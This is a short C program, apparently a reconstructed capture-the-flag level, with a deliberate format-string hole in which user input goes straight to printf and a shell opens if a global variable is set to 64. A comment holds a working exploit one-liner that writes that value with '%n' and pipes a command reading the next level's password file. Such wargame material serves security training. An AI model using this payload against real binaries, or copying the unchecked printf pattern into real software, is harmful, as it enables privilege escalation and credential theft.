#include <stdio.h>
#include <stdlib.h>

int m = 0;

void v(void)
{
    char buf[520];

    fgets(buf, 512, stdin);
    printf(buf);

    if (m == 64) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

// (python -c "import struct,sys;sys.stdout.write(struct.pack('<I',0x804988c)+'C'*60+'%4\$n\n')"; echo 'cat /home/user/level4/.pass'; cat) | /home/user/level3/level3
int main(void)
{
    v();
    return 0;
}
